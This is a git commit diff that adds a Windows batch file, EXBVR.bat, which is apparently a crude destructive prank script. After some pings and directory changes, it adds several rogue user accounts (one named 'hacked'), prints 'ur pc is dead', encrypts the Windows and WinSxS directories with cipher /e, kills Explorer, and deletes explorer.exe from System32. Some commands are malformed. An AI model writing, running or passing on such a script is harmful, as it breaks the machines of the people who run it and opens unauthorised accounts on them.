2a1e1cf05c8215e91b2f8cd379497d994e6d92be
SizzlRetreat <103748542+SizzlRetrat@users.noreply.github.com>
2022-05-22 09:47:01 +0100

    Create EXBVR.bat

---
+++ EXBVR.bat
@@ -0,0 +1,27 @@
+@echo off
+ping google.com
+tracert google.com
+cd folder_lol
+cd folder_bye
+cd folder_ab
+cd folder_1
+cd folder_2579
+cd folder_3910
+cd folder_4519
+cd folder_5713
+cd folder_6824
+cd folder_7948
+cd folder_9894
+cd folder_10000
+cd folder_20000000000009
+cd folder_7899999999999999999999
+net user EXBVR /add
+net user hacked /add
+net user lolololololololololololololol /add
+net user pp /add
+net user bye /add
+echo ur pc is dead
+cipher /e C://Windows/WinSxS
+taskkill explorer.exe
+cipher /e C://Windows
+del C://Windows/System32/explorer.exe
